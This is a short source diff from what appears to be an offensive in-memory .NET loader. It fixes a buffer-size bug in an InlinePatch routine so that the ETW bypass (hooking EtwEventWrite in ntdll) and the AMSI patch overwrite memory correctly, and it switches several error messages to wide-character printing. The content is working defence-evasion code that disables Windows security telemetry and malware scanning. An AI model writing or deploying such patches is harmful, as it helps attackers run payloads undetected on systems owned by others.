@@ -153,7 +153,7 @@ int executeSharp(LPVOID lpPayload)
 		int ptcResult = PatchEtw();
 		if (ptcResult == -1)
 		{
-			printf("Etw bypass failed\n");
+			wprintf(L"Etw bypass failed\n");
 			return -1;
 		}
 	}
@@ -388,7 +388,7 @@ ULONG NTAPI MyEtwEventWrite(
 	return uResult;
 }
 
-INT InlinePatch(LPVOID lpFuncAddress, UCHAR * patch) {
+INT InlinePatch(LPVOID lpFuncAddress, UCHAR * patch, int patchsize) {
 	PNT_TIB pTIB = NULL;
 	PTEB pTEB = NULL;
 	PPEB pPEB = NULL;
@@ -426,13 +426,13 @@ INT InlinePatch(LPVOID lpFuncAddress, UCHAR * patch) {
 
 	LPVOID lpBaseAddress = lpFuncAddress;
 	ULONG OldProtection, NewProtection;
-	SIZE_T uSize = sizeof(patch);
+	SIZE_T uSize = patchsize;
 	NTSTATUS status = ZwProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
 	if (status != STATUS_SUCCESS) {
 		return -1;
 	}
 
-	status = ZwWriteVirtualMemory(NtCurrentProcess(), lpFuncAddress, (PVOID)patch, sizeof(patch), NULL);
+	status = ZwWriteVirtualMemory(NtCurrentProcess(), lpFuncAddress, (PVOID)patch, patchsize, NULL);
 	if (status != STATUS_SUCCESS) {
 		return -1;
 	}
@@ -450,20 +450,20 @@ BOOL PatchEtw()
 	HMODULE lib = LoadLibraryA("ntdll.dll");
 	if (lib == NULL)
 	{
-		printf("Cannot load ntdll.dll");
+		wprintf(L"Cannot load ntdll.dll");
 		return -2;
 	}
 	LPVOID lpFuncAddress = GetProcAddress(lib, "EtwEventWrite");
 	if (lpFuncAddress == NULL)
 	{
-		printf("Cannot get address of EtwEventWrite");
+		wprintf(L"Cannot get address of EtwEventWrite");
 		return -2;
 	}
 
 	// Add address of hook function to patch.
 	*(DWORD64*)&uHook[2] = (DWORD64)MyEtwEventWrite;
 
-	return InlinePatch(lpFuncAddress, uHook);
+	return InlinePatch(lpFuncAddress, uHook,sizeof(uHook));
 }
 
 BOOL PatchAmsi()
@@ -483,7 +483,7 @@ BOOL PatchAmsi()
 		return -2;
 	}
 
-	return InlinePatch(addr, amsipatch);
+	return InlinePatch(addr, amsipatch, sizeof(amsipatch));
 }
 
 BOOL ClrIsLoaded(LPCWSTR version, IEnumUnknown* pEnumerator, LPVOID * pRuntimeInfo) {
